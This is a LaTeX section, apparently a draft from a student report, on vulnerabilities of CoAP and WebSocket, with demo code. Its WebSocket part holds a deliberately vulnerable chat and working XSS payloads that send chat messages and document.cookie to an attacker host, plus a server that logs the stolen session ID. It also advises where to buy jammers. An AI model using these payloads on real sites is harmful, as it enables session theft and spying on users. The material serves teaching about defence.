@@ -1,0 +1,628 @@
+	\section{Vulnerabilities and possible attacks}
+	
+	\subsection{CoAP vulnerabilities}
+	In an IoT environment, the data sent from a constrained device to a server are, most of the time, the measures taken by a sensor or an array of sensors; the server collects this data, which will be sooner or later processed in some way.\newline
+	In this particular scenario an attacker may have nothing interesting to steal in the communication between a device and the server, but it is important to avoid the forwarding of fake message from the attacker.\newline
+	Another possible scenario is the opposite of the previous one, the server sends data to devices; this could be the typical scenario of a production line, where the server sends the parameter in order to customize the production, here is quite important to keep secure the parameters in order to avoid industrial espionage that could advantage competitors.\newline
+	The two scenarios described can employee any protocol that suits well your business; if CoAP suits well in particular project, it is important to take into account its possible vulnerabilities and in this section we will analyze them.\newline
+	
+	\subsubsection{Denial of Service}
+	//to do
+	
+	\paragraph{DoS on the client}
+	\begin{figure}
+		\includegraphics[width=\linewidth]{coap-vuln-img0.png}
+		\caption{Example of possible DoS on the client side.}
+		\label{fig:coap-vuln0}
+	\end{figure}
+	A denial of service can be carried out as illustrated in figure \ref{fig:coap-vuln0}.\newline
+	
+	We assume the following:
+	\begin{itemize}
+		\item The attacker is capable of intercepting messages.
+		\item The attacker can respond faster than the server.
+		\item The client is programmed in bad way and will block if it cannot send the data successfully.
+	\end{itemize}
+
+	For the client we assume the following behavior:
+	\begin{lstlisting}
+	//Language: pseudo-code
+	
+	var measure=takeMeasure();
+	
+	while(send(measure,server));
+	
+	//perform other tasks
+	\end{lstlisting}
+	
+	If the attacker intercepts a CON message, then it forges a RST message with a spoofed IP pretending to be the server, the client will be tricked and could not proceed with the other tasks.\newline
+	In this case we exploited the fact that the client assume that its request will be fulfilled sooner or later, and it does not take into account that an attacker could perform a DoS.\newline
+	
+	Even if the server sends an ACK it will be ignored because the client will have already received the RST message, and will ignore the ACK.\newline
+	
+	In this particular example, we are carrying out the denial of service on the constrained device, but there are two interesting consequences to discuss:
+	\begin{enumerate}
+		\item The constrained device will try infinitely to send the data; this could flood the server with the same data for a very long time.
+		\item The constrained device is likely to exhaust its energy quickly due to the continuous attempts of sending data and receiving the proper response from the server.
+	\end{enumerate}
+
+	In the first case, if the server stores the data received it may exhaust its memory or uses an old data that is considered fresh, suppose that we are dealing with a nuclear reactor that has a sensor for the temperature, if at 9.00 AM the temperature was correct but it increased a lot after one hour then the server will still receive the old one and will not notice the imminent risk that could lead to a disaster if a counter measure is not taken in time.\newline
+	
+	In the second case, if the constrained device exhausts its energy then the server may not proceed with its task due to the lack of data.\newline
+	
+	In a constrained device, a low level language is likely to be used, this means that lots of convenient features likes asynchronous method or callback are not implemented and if you want to use them, you must take care of implementing them by yourself, it must also be taken into account that the resources are limited so a simpler approach on the code may be mandatory, making the infinity while loop, which tries to send the data, the only possible viable way.\newline
+	
+	\paragraph{DoS on the server}
+	Performing a DoS on the server is a bit more easy because the attacker does not need to intercept messages but simply sends lots of messages to the server.\newline
+	
+	We assume that a server has a computational power that is higher than a common desktop computer, so an attacker may not be capable of carrying out a successful DoS alone, it may need one or more machines and perform a distributed denial of server in order to overwhelm the server.\newline
+	Basically, a DDoS is a DoS performed by more than one machine at the same time, usually these machines are infected by the attacker long before the attack.\newline
+	
+	Figure \ref{fig:coap-vuln1} illustrates the difference between a DoS and DDoS.
+	
+	\begin{figure}
+		\includegraphics[width=\linewidth]{coap-vuln-img1.png}
+		\caption{On the left the schematization of a DoS, on the right a DDoS.}
+		\label{fig:coap-vuln1}
+	\end{figure}
+
+	Avoiding a DoS is not simple, the fact that CoAP uses UDP as underlying protocol makes the process of performing DoS more simple because UDP is a fast protocol by design.\newline
+	
+	Identifying a DoS is difficult because a server may receive lots of request that are totally legal, for example: when a new service is made available to the public, it is possible to experience a DoS because the server is not capable of handling the amount of requests, this happens when the development team underestimate the number of user interested in the new service.\newline
+	Blocking incoming request from a certain IP is not a good idea because NAT (Network Address Translation) is used massively, thus different client are identified by the same IP when they reach the server, so if the IP is blocked some legitimate user may not be able to reach the server.\newline
+	While dealing with an IoT system, the architecture (simplified) of the system could be the one illustrated in figure \ref{fig:coap-vuln2}, where the CoAP server does not communicate directly with the client, in this particular case blocking IP could be a good choice, if the CoAP server is designed to communicate only with the constrained devices and the HTTP server, then there is no need to allow communication from other IP.\newline
+	Anyway, the HTTP server may be vulnerable to DoS attack, and by attacking it, it could be possible to generate a high traffic between the two servers and generate a denial of server even on the CoAP side.\newline
+	
+	\begin{figure}
+		\includegraphics[width=\linewidth]{coap-vuln-img2.png}
+		\caption{Possible architecture of an IoT application.}
+		\label{fig:coap-vuln2}
+	\end{figure}
+	
+	IoT systems that deal with serious tasks like health monitoring or the previous example of the nuclear reactor must have DoS prevention system in order to continue the execution of the main task.\newline
+	It could be a good idea to isolate the IoT system from the Internet in order to avoid incoming unwanted request, the HTTP server will always be reachable, but if it sends too much requests to the CoAP server, then it should be blocked for a certain amount of time, of course this will make the system unavailable, but at least the main task is preserved.\newline
+	//sto pezzo è da rivedere
+	Mixing this idea with the well-known technique used to reduce the effects of DoS on an HTTP server could lead to a system that is resistant to DoS.\newline
+	Of course, if the IoT system is not reachable via Internet, and the HTTP server is resistant to DoS attack, there is no need to add the idea proposed here.\newline
+	
+	\paragraph{UDP flood}
+	UDP flood is a special DoS attack which exploits the UDP protocol; when a UDP packet reaches its recipient, then the recipient checks if there is an application listening on a specific port for this particular packet.\newline
+	If an application is listening, then it receives the packet, otherwise an ICMP Destination Unreachable packet is sent back to the sender.\newline
+	
+	With IPv4 the maximum UDP packet size is 65535 bytes, if an attacker starts to send a huge amount of packets to a recipient, he could easily flood the network.\newline
+	Of course, when the recipient receives a message, it will reply with an ICMP Destination Unreachable packet, which will generate other traffic in the network.\newline
+	
+	Performing this attack with more than one machine at the same time could be very effective; it could be used to take down both client and server.\newline
+	
+	A constrained device which uses CoAP could be vulnerable to this particular attack, as we know CoAP is based on UDP, thus the device could be the target of a UDP flood attack, and due to the limited computational resource, it will crash quickly.\newline
+	
+	A firewall can avoid or mitigate this attack, simply by blocking unwanted network traffic, however the firewall could fall victim of this attack instead of the host if it is not capable of handling a huge amount of traffic.\newline
+	
+	\subsubsection{Proxy as man in the middle}
+	A proxy is, from the security point of view, a man in the middle between the client and the server, who could intercepts messages and manipulate them.
+	
+	\begin{figure}
+		\includegraphics[width=\linewidth]{coap-vuln-img3.png}
+		\caption{Man in the middle attack on CoAP.}
+		\label{fig:coap-vuln3}
+	\end{figure}
+	
+	Figure \ref{fig:coap-vuln3} illustrate where a corrupted proxy is placed in order carry out a man in the middle attack.\newline
+	
+	In order to place act as man in the middle an attack should be capable of intercepting messages and avoid the forwarding of real messages to the server.\newline
+	If the constrained network has a legitimate proxy, the easiest way is to take control of it in some way, installing a physical proxy could not be feasible or may be easy to detect.\newline
+	If an attacker can act as a man in the middle by corrupting a proxy, then even using TLS is useless, that is because the attacker establishes two secure communications, one with the client and one with the server.\newline
+	In this way a man in the middle can simply read the communication or edit the content of a message at will.\newline
+	
+	Another important thing to highlight that the protocol does not enforce that a proxy, that receives an encrypted message from a client, must forward the message to the server in an encrypted way.
+	Figure \ref{fig:coap-vuln4} illustrates the situation.\newline
+	
+	\begin{figure}
+		\includegraphics[width=\linewidth]{coap-vuln-img4.png}
+		\caption{Insecure communication between a client and a server with a proxy in the middle.}
+		\label{fig:coap-vuln4}
+	\end{figure}
+	
+	In this case the communication is secure only in one side, but the fact that it is not secure on the other side makes it completely insecure, so an attacker could simply exploit this behavior in order to leak information from the communication if the attacker is capable of intercepting messages.\newline
+	
+	\subsubsection{Cache poisoning}
+	If an attacker has taken control of a proxy, then it could manipulate its cache and caching a response forever, clients will then receive outdated messages that could lead to wrong behavior.\newline
+	Otherwise if the attack has found vulnerabilities on the client, and it is possible to trigger them with a particular response, it could cache a special response that may lead to the crash of the constrained device or to unexpected behavior.
+	
+	\subsubsection{Random number generator}
+	The CoAP protocol specifies that a token should be generated with the aid of a secure pseudo-random number generator, in order to avoid trivial and predictable token.\newline
+	However, this is not possible in all situations; a secure pseudo-random number generator needs a good source of entropy, but a constrained device may lack this source.\newline
+	
+	Using an unsecure random number generation could lead to predictable token, a simple and common RNG could be implemented with a linear congruential generator which is defined as:
+	
+	\begin{equation}
+	x_{n+1}=(a\cdot x_n+c)mod m
+	\end{equation}
+	Where $m$ is the modulus and is $>0$, a is the multiplier and has values in $(0,m)$, $c$ is the increment and has values in $[0,m)$.
+	A linear congruential generator can be cracked easily by simply observing its output, as demonstrated here:
+	\url{https://tailcall.net/blog/cracking-randomness-lcgs/} \newline
+	If a constrained device is known to lack a good source of entropy, it must not be used for process where this entropy is needed, for example: if a key is needed, then it must be generated on another system and then added to the device during the manufacturing phase.
+	
+	\subsubsection{Device and resource discovery}
+	CoAP has a device and resource discovery features, they are extremely important in M2M application where, most of the time, the human hand is needed only during the deployment of the system.\newline
+	
+	In order to discover a CoAP server, the client must either know about the resource ahead of time, or support multicast CoAP.\newline
+	A server is discoverable if it listen on the CoAP multicast address \texttt{224.0.1.187} for IPv4, \texttt{FF05::FD} for IPv6 on the default port 5683.\newline
+	If a client sends a request for the CoAP resource \texttt{/.well-known/core} it should receive a response, from every reachable CoAP server on the local network.
+	If an attacker can create its own CoAP server on the network it could act as malevolent host in the network, or even acting as a legitimate server.
+	A possible attack scenario is illustrated in figure \ref{fig:coap-vuln5}.
+	
+	\begin{figure}
+		\includegraphics[width=\linewidth]{coap-vuln-img5.png}
+		\caption{Example of resource discovery attack.}
+		\label{fig:coap-vuln5}
+	\end{figure}
+	
+	The attacker acts as a legitimate server and performs a DoS on the legitimate CoAP server in order to make it unreachable to the CoAP client that tries to discover new devices.\newline
+	In this way the attacker is the only device that can be discovered by the client, if the attacker makes available a resource recognized as legitimate by the client, the attack can trick the client and act as the legal server.\newline
+	If we are in a scenario where the server sends parameter to a product line, if an attacker manages to replace the legal server with its malevolent version, then he can control the product line at will.\newline
+	
+	Dynamic device and resource discovery is useful because there is no need to manually configure available CoAP server, but if not done with the proper care it could lead to the scenario illustrated in figure \ref{fig:coap-vuln5}.
+	In order to avoid this kind of attack, it can be useful to allow communication only with authenticated server, but of course the convenience of dynamic discovery is lost.\newline
+		
+	\subsection{CoAP attacks}
+	
+	In this section I will analyze the vulnerabilities of the Constrained Application Protocol showing example of attack when possible.\newline
+	Attacks can be categorized in two big families: physical and remote, an attack is physical when the attacker has physical access to the constrained devices;
+	on the other hand an attack is remote when the attacker has no physical access to the constrained devices.\newline
+	
+	\subsubsection{Physical attack}
+	While dealing with physical attack we assume the following:
+	\begin{itemize}
+		\item The attacker has full access to the constrained devices and in general to the entire network component.
+		\item The constrained devices are in an unattended environment (close or open it makes no difference).
+		\item The CoAP server and other server machines are in a closed environment, little surveillance is assumed.
+	\end{itemize}
+	
+	\paragraph{Denial of Service}
+	
+	If an attacker has physical access to constrained devices or a main CoAP server it can carry out a denial of service in a variety of way.\newline
+	\subparagraph{Jamming}
+	This DoS can be carried out on wired and wireless network and it requires a jammer.\newline
+	A jammer is a device which transmits signals on the same radio frequencies of the target, making the communication impossible by preventing them from receiving and transmitting in the jammer’s operative range.\newline
+	Carry out a DoS on a wired constrained network which uses Ethernet could be difficult with a jammer because you may need very high frequency and it could be costly, but a good alternative could be a powerful magnet placed near the cables.\newline
+	In order to carry out a DoS on a wireless constrained network which uses IEEE 802.11 we simply need to use a jammer that works on the 2.4GHz and 5GHz frequencies.\newline
+	
+	For the fact that CoAP is based on UDP, there could be high packet loss and lots of retransmission, for this reason a jamming DoS could be hard to notice.\newline
+	
+	A jammer could have different dimension based on how wide is its operative range, if the constrained network you want to take down is small you can use a small jammer that may be hidden in the environment, but remember that sooner or later the battery will exhaust and the DoS will cease; you can also use a big jammer with a very wide operative range, you may even place it in a different building and carry out the DoS without caring about battery life, but in this case you could take down other network and making your attack more noticeable.\newline
+	
+	\textbf{Note:} in most of countries jammer are illegal and can be used legally only by the army or the police, but if you want you can find jammers on sale on the Internet easily, even on Amazon, but for professional tools it is better you call on to specialized retailers.\newline
+	
+	There is no general countermeasure against jammer, in the case of wired network, shielded cables can be used but for a wireless network there is no way to avoid a jamming DoS, the only way is to find out the source and shut it down.\newline
+	
+	\subparagraph{Destroying the device}
+	Another simple DoS could be carried out simply by destroying the devices in the way you prefer.\newline
+	Of course this approach is not stealth at all because when someone will notice the malfunctioning and after investigating on the environment it will find out the smashed devices, while in the case of a jammer it could be difficult to spot the source of the problem.\newline
+	Of course this technique could be applied even on the CoAP server or other machines, but as assumed a server could be in an environment where it is more likely to be spotted, so it could be risky.\newline
+	
+	If the constrained network is wired then an attacker could simply cut the cables and carry out the DoS.\newline
+	
+	The easiest way to secure constrained device is to turn the unattended environment into a secure environment in some way, if we are dealing with an open environment, building a fence with barbed wire around the device could be a solution, if the environment is closed then you could place a security camera or restrict the access to the area.\newline
+	
+	\subsubsection{Corrupting a device}
+	For this attack we assume that the network uses the NoSec mode.\newline
+	If the attacker has physical access to a device, he could corrupt it in order to act as malevolent node by sending spoofed request around the network in order to create congestion in the constrained network.\newline
+	
+	The standard scenario in a constrained network is the following:
+	\begin{itemize}
+		\item Constrained devices send data to a CoAP server.
+		\item The CoAP server receives request from the constrained devices.
+		\item A desktop application communicate with the CoAP server in order to retrieve data.
+	\end{itemize}
+
+	Usually a constrained device is interested in sending data to the server and it may be not capable of receiving huge amount of data as response, so the response to a GET request could be difficult or impossible to handle.\newline
+	
+	If a corrupted device starts sending spoofed request to a CoAP server it could exploit amplification attack and redirect huge amount of data to the constrained devices in the network.\newline
+	
+	An attacker could also exchange a device with a malevolent one designed to act as describe before.\newline
+	
+	\subsubsection{Forgery and data stealing}
+	For this kind of attack we mean the forgery of a constrained device in order to steal some data, in this case we are interested in being silent as possible in order to avoid being noticed.\newline
+	
+	If we are only interested in stealing data only once it may be not necessary to forge a device.\newline
+	
+	\paragraph{Cloning}
+	If an attacker has physical access to a device, he may be able to clone it in order to place a modified version in the environment and act as a legitimate device.\newline
+	Cloning a device could be an easy task but at the same time a difficult one, for example: on the market there are tools that can copy key car in few seconds, but in order to clone a device the attacker may need to know perfectly its structure in order to create a cloning device, and this could require lots of time and may discourage the attacker.\newline
+	It is important to highlight that every device is different, so there is no general technique to apply in order to clone a device.\newline
+	
+	\paragraph{Firmware replacement}
+	Typically updates of constrained devices are made over-the-air, an attacker could get in the way and install malicious software if this procedure has no protection, if successful the attack could even corrupt an entire network.\newline
+	
+	When we install an update it is important to verify if the update is legitimate, otherwise we could accept malevolent update from an attacker, while dealing with constrained devices the computational power available could be not enough to verify an update, as we said a constrained device could not be able to verify the expiration of a certificate, so it is plausible to assume that the device could not verify an update.\newline
+	
+	The network could be insecure for a variety of reasons: simply for hardware limitations or by negligence of the network administrator; a firmware replacement attack could be easy to carry out in this condition, the consequences can be serious, if the new firmware, designed by the attacker, blocks every new update the only way to sanitize a corrupted network is to manually replace the firmware by flashing the memory of each device, this could be costly and time consuming; another possible scenario could be an attacker that craft a firmware that steals data silently , it may require lots of time to be noticed by someone, and if the data are valuable it can be a loss of money for a company.\newline
+	
+	\textbf{Note:} even if the communication on-the-air is encrypted the attacker could know the keys used to communicate, so he can still carry out the attack.\newline
+	
+	Compared to the cloning attack, the firmware replacement attack could be easy to carry out and it only requires writing a firmware and uploads it on devices.\newline
+	
+	In order to update a device in a secure way, it must be capable to verify a certificate in order to verify that the update is legitimate, if the device is not powerful enough an alternative way could be to update it manually by flashing the memory, but it may require some time and could be costly.\newline
+	
+	\paragraph{Extraction of security parameters}
+	As we know a constrained device may have keys and other security parameters embedded on it, if an attacker has physical access to the device and is capable of reading its memory it can steal keys or other security parameters.\newline
+	This could be done easily with a server or pc with a cold boot attack, but we are dealing with constrained devices and the physical memory may not be so easy to handle, with server and pc we have the DDRX standard and it is easier to design a special tools for dumping memory.\newline
+	
+	If there is no easy way to access the memory, this kind of attack could be difficult to carry out.
+	On the other hand if the device has a USB port or any other standard I/O port it could be trivial to steal sensible data.
+	
+	
+	\subsubsection{Remote attack}
+	When we talk about remote attack we mean that the attacker has not physical access to devices, these are the most interesting case because it is possible to show real example.
+	
+	
+	\subsection{WebSocket vulnerabilities}
+	In this section I will analyze the vulnerabilities of WebSocket showing example of attack when possible.
+	
+	\subsubsection{Lack of client authentication}
+	WebSocket does not specify any authentication mechanism; this allows the developer to use any suitable method.
+	From a point of view this is good because a developer is free to choose the method that suits well his project, on the other hand being to free could lead to flaws in the code.\newline
+	The authentication method employed could be vulnerable or implemented in the wrong way, or even not implemented.\newline
+	The straightforward ways are the following:
+	\begin{itemize}
+		\item Cookies
+		\item HTTP Authentication
+		\item TLS Authentication
+	\end{itemize}
+
+	But the developer could implement a homemade authentication method, if not implemented with care it could lead to vulnerabilities.\newline
+	
+	When you are dealing with WebSocket in a browser it is important to highlight that there is no way to add header to the handshake message, it is possible to add the \texttt{Authorization} (but only for basic authentication), \texttt{Sec-WebSocket-Protocol} and \texttt{Cookie}.\newline
+	Thus, for instance it is not possible to use the Bearer token authentication or other authentication mechanism different from the basic authentication.\newline
+	
+	Let us analyze a wrong authentication method that is exploitable, note that the example is made with ws and not wss because it is useless for this example to show how to add a certificate in a browser in order to avoid it to reject the connection due to the unrecognized certificate.\newline
+	
+	The system proposed is designed to show a page that uses a WebSocket only if the user is logged in, basically the security mechanism is based on the assumption that the WebSocket service will be used only inside the browser; we will now show that this mechanism is not secure at all.
+	
+	\textbf{Note:} this is a toy example that allows the login with the following credential: \texttt{admin admin}, it is not supposed to be a secure login procedure, it is unsecure but it works well in order to make this example easy to reproduce.
+	
+	\begin{lstlisting}[language=php]
+	//login.php
+	<?php
+	session_start();
+	?>
+	
+	<html>
+		<head>
+			<title>Login page</title>
+		</head>
+		<body>
+			<form method="POST" action="reserved.php">
+			<?php
+			if(isset($_GET["err"]))echo "<div>Invalid username or password.</div>";
+			?>
+			<input type="text" id="usr" name="usr">
+			<input type="password" id="pwd" name="pwd">
+			<input type="submit" id="sub" value="Login">
+			</form>
+		</body>
+	</html>
+	
+	\end{lstlisting}
+	
+	\begin{lstlisting}[language=php]
+	//reserved.php
+	<?php
+	
+		$usr=isset($_POST["usr"])?$_POST["usr"]:null;
+		$pwd=isset($_POST["pwd"])?$_POST["pwd"]:null;
+		
+		if(($usr==null || $pwd==null) || (strcmp($usr,"admin")!=0 || strcmp($pwd,"admin")!=0)){
+		header("Location: http://localhost/login.php?err=true");
+		exit();
+	}
+	?>
+	
+	<html>
+		<head>
+			<title>Reserved page</title>
+		</head>
+		<body>
+			<b>Welcome admin</b>
+			<div id="placer"></div>
+			<script>
+				var placer=document.getElementById("placer");
+				var ws=new WebSocket("ws://localhost:8080/");
+				ws.onmessage=function(event){
+					var elem=document.createElement("b");
+					elem.textContent=event.data;
+					placer.appendChild(elem);
+				}
+			</script>
+		</body>
+	</html>
+	\end{lstlisting}
+	
+	\begin{lstlisting}[language=Java]
+	//Reserved.java
+	import java.net.InetSocketAddress;
+	
+	import org.java_websocket.WebSocket;
+	import org.java_websocket.handshake.ClientHandshake;
+	import org.java_websocket.server.WebSocketServer;
+	
+	public class Reserved extends WebSocketServer  {
+	
+		public static void main( String[] args ){
+			String host = "localhost";
+			int port = 8080;
+			WebSocketServer server = new Reserved(new InetSocketAddress(host, port));
+			System.out.println("starting ...");
+			server.run();
+		}
+		
+		public Reserved(InetSocketAddress address) {
+			super(address);
+		}
+		
+		@Override
+		public void onClose(WebSocket arg0, int arg1, String arg2, boolean arg3) {
+		
+		}
+		
+		@Override
+		public void onError(WebSocket arg0, Exception arg1) {
+		
+		}
+		
+		@Override
+		public void onMessage(WebSocket arg0, String arg1) {
+			arg0.send("message received!");
+		}
+		
+		@Override
+		public void onOpen(WebSocket arg0, ClientHandshake arg1) {
+			arg0.send("this message should be read only by Admin");
+		}
+		
+		@Override
+		public void onStart() {
+		
+		}
+	}
+	
+	\end{lstlisting}
+	
+	The Java server's code requires the following library: \url{https://github.com/TooTallNate/Java-WebSocket}.\newline
+	
+	The login page shows a login form and when the login button is pressed it send a POST request to the reserved page in order to verify the login credential and access the reserved page, if the login credential are correct the access is granted, otherwise the user is redirected to the login page.\newline
+	The WebSocket server sends a message when it receives a new connection and it will send a new message when it receives one from the client.\newline
+	If the user is not able to login then we may think that the reserved data sent by the WebSocket server is safe from prying eyes, but it is not true, in fact we could create our custom client and connect to the WebSocket server without problem.\newline
+	
+	The following code is written in Node.js and requires the following library: \url{https://github.com/websockets/ws}.\newline
+	
+	\begin{lstlisting}
+	var WebSocketClient = require('websocket').client;
+	
+	var client = new WebSocketClient();
+	
+	client.on('connectFailed', function(error) {
+		console.log('Connect Error: ' + error.toString());
+	});
+	
+	client.on('connect', function(connection) {
+		
+		connection.on('message', function(message) {
+			if (message.type === 'utf8') {
+				console.log("Received: '" + message.utf8Data + "'");
+			}
+		});
+		
+	});
+	
+	client.connect('ws://localhost:8080/');
+	
+	\end{lstlisting}
+	
+	Unsurprisingly the output is:
+	\texttt{Received: 'this message should be read only by Admin'}.\newline
+	This shows that an unsecure authentication method could lead to data leak, and if the WebSocket is dealing with precious data this could be a very big problem.\newline
+	
+	\subsubsection{Lack of data validation}
+	
+	The data validation task is not done by WebSocket but by the application itself, this could to flaws in the code.\newline
+	The validation should be done on both sides: client and server.\newline
+	The simplest attack that can be performed by exploiting this lack of validation could be a JavaScript code injection (client side).\newline
+	A simple example is the following vulnerable web chat.\newline
+	
+	\begin{lstlisting}[language=html]
+		//page.html
+		<html>
+			<head>
+				<title>Chat</title>
+			</head>
+			<body>
+				<div id="chat">
+				<div>No message for now</div><br>
+				</div>
+				<hr>
+				Write here:<input type="text" id="msg">
+				<button id="send" onclick="send()">Send!</button>
+				<script src="chat.js"></script>
+			</body>
+		</html>
+	\end{lstlisting}
+	
+	\begin{lstlisting}
+	//chat.js
+	var chatbox=document.getElementById("chat");
+	var i=0;
+	
+	function addMsg(msg){
+		if(i==0){
+			chatbox.innerHTML="<div>"+msg+"<div><br>";
+			i++;
+		}else{
+			chatbox.innerHTML+="<div>"+msg+"<div><br>";
+		}
+	}
+	
+	var ws=new WebSocket("ws://localhost/");
+	ws.onmessage = function (event) {
+		addMsg(event.data);
+	}
+	function send(){
+		var msg=document.getElementById("msg").value;
+		addMsg(msg);
+		ws.send(msg);
+	}
+	\end{lstlisting}
+	
+	\begin{lstlisting}[language=Java]
+	Java (Server side)
+	Requires this library: https://github.com/TooTallNate/Java-WebSocket
+	// ChatServer.java
+	package id.id2;
+	
+	import java.net.InetSocketAddress;
+	
+	import org.java_websocket.WebSocket;
+	import org.java_websocket.handshake.ClientHandshake;
+	import org.java_websocket.server.WebSocketServer;
+	
+	public class ChatServer extends WebSocketServer  {
+	
+		private WebSocket arr[]=new WebSocket[2];
+		private int i=0;
+		
+		public static void main( String[] args ){
+			String host = "localhost";
+			int port = 80;
+			WebSocketServer server = new ChatServer(new InetSocketAddress(host, port));
+			System.out.println("starting ...");
+			server.run();
+		}
+		
+		public ChatServer(InetSocketAddress address) {
+			super(address);
+		}
+		
+		@Override
+		public void onClose(WebSocket arg0, int arg1, String arg2, boolean arg3) {
+		
+		}
+		
+		@Override
+		public void onError(WebSocket arg0, Exception arg1) {
+		
+		}
+		
+		@Override
+		public void onMessage(WebSocket arg0, String arg1) {
+			if(arg0.getRemoteSocketAddress().equals(arr[0].getRemoteSocketAddress())){
+				arr[1].send(arg1);
+			}else{
+				arr[0].send(arg1);
+			}
+		}
+		
+		@Override
+		public void onOpen(WebSocket arg0, ClientHandshake arg1) {
+			if(i>arr.length){
+				arg0.close();
+				return;
+			}
+			arr[i++]=arg0;
+		}
+		
+		@Override
+		public void onStart() {
+		
+		}
+	}
+	
+	\end{lstlisting}
+	
+	The HTML page simply shows the messages and a little form to write and send a message.\newline
+	The JavaScript code simply handles the interface and the WebSocket connection, when the button is clicked by the user the message is add to the chatbox and sent to the WebSocket server that will send it to the other client (if present).\newline
+	The Java code creates a WebSocket server that handles only two connections and simply acts as a proxy between the two clients.\newline
+	Neither the client neither the server perform a check of the incoming data, from the point of view of the server it is not a problem, it does nothing more than simply forward the message to the other client, but we could say that it is not guaranteeing a secure communication between the two clients.\newline
+	On the other hand the client is severely at risk, in fact if client A is chatting with client B, and client B sends the following message:\newline
+	
+	\begin{lstlisting}[language=html]
+	<img src=1 hidden onerror=”alert('HACKED!!')”>
+	\end{lstlisting}
+	
+	Then an alert box will compare on the other client’s browser (even on the client which send the message).
+	In this case no damage has been done to the other client, but if the code placed inside the \texttt{onerror} callback is bit more complex it could create serious harm to the client, for example we could open another WebSocket in order to spy the user, for example:
+	
+	\begin{lstlisting}[language=html]
+		<img src=1 hidden onerror="var badws=new WebSocket('ws://10.0.3.40:8080/'); function send(){var msg=document.getElementById('msg').value;addMsg(msg);ws.send(msg);badws.send(msg);} var tmp=document.getElementById('send'); tmp.onclick=send;">
+	\end{lstlisting}
+	
+	In this example we created a new WebSocket and defined again the \texttt{send(…)} function invoked by the button that sends a message, we added: \texttt{badws.send(msg)} in order to forward the message to another server.
+	We are also exploiting some JavaScript’s features, but this is not the appropriate section and we will talk about it later on.
+	The code for the malicious server is very similar to the code of the legitimate WebSocket server, it only write on the console the received messages.
+	
+	In order to avoid trivial attack like the one presented, the client should always check incoming data, and if the data must be showed to the user it must be sanitized properly.\newline
+	Another possible way to avoid an attack like that is to perform a sanitization even server side, in such a way the server act as a proxy that secure the messages, of course the client must still check the incoming data, assuming that the server is not compromised is a strong assumption that should not be done.\newline
+	
+	I will now show you an example that could leak important information contained in a cookie, for example the session id, if an attacker is capable of stealing your session id he can access the website with your credentials without the need of knowing your username and password.\newline
+	
+	\texttt{Note:} again the login procedure is not secure, the focus is not on it and it is as simple as possible in order to make this example easy in order to be reproduced.\newline
+	
+	//aggiungere il codice
+	
+	The login page is the same seen before in a previous example, the reserved page is similar but it allows the access with the following credentials:
+	\begin{itemize}
+		\item \texttt{pippo pippo}
+		\item \texttt{pluto pluto}
+	\end{itemize}
+	Then the page include the code of the previous chat example, the javascript code is the same and even the Java server code.\newline
+	
+	In order to steal the cookie we need to send the following message:
+	\begin{lstlisting}
+		<img src=1 hidden onerror=" document.location='http://10.0.3.40:8090/stealer?v='+document.cookie;">
+	\end{lstlisting}
+	
+	
+	The cookie is sent over, so the malevolent server is capable of stealing it.\newline
+	
+	\begin{lstlisting}
+		//
+		var http = require('http');
+		
+		var server = http.createServer(function (req, res) {
+			console.log("Cookie retrived:"+req.url);
+			res.end('! HACKED !');
+		})
+		
+		server.listen(8090,'10.0.3.40');
+	\end{lstlisting}
+	
+	
+	The output of the server is the following:
+	
+	\texttt{Cookie retrived:/stealer?v=PHPSESSID=vcqqs219ns7b4naui67bmug}.\newline
+	
+	Opening a new WebSocket will not give you the cookie, in fact the cookie can be sent over if the host is the same of the web page, and our malevolent server is likely to be on a different address, using the \texttt{document.cookie} in order to create a false cookie is not that easy because the browser avoid the creation of cookie related to other domains.
+	But it is possible to send the cookie via WebSocket with a simple invocation of the send(…) method, in fact with this script it is possible to trick a client:
+	
+	\begin{lstlisting}
+		<img src=1 hidden onerror="var badws=new WebSocket('ws://10.0.3.40:8090/'); badws.onopen=function(event){ var tmp=document.cookie;badws.send(tmp);}">
+	\end{lstlisting}
+
+	
+	The malevolent WebSocket code is equal to the other just seen before; it simply receives the cookie and stores it.\newline
+	This approach is better because it is silent; the previous one was easy to notice by a user simply because the page in front of him changed.\newline
+	Note: this is a special because the cookie used by PHP via JavaScript, there are case where a Cookie cannot be retrieved by \texttt{document.cookie} and this does not allow an attacker to steal precious data from a client.
+	In order to avoid the retrieval of a cookie by JavaScript, it must be marked with \texttt{HttpOnly} flag.
+	Remember that even if you store data in the \texttt{SessionStorage} you are not safe at all because an attacker could access it.
+	With these two examples is clear how data validation is important and must be performed in order to avoid serious attack.
+	
+	\subsubsection{Insecure sub-protocol}
+	When a WebSocket connection is being created, a sub-protocol could be negotiated by client and server in order to agree on a common way to communicate each other, basically WebSocket is only used as a means of transport, and the sub-protocol is employed to handle the exchange of message.\newline
+	The sub-protocol responsibilities is leaved to the developer, there could be common sub-protocol already implemented, but usually is something that developer will implement based on his needs.\newline
+	This could lead to vulnerabilities if the sub-protocol is not implemented correctly on both client and server.\newline
+	
+	Basically, these kind of vulnerabilities rely on the misunderstanding of the sub-protocol specification.
+	
+	
+	
+	\subsection{WebSocket attacks}
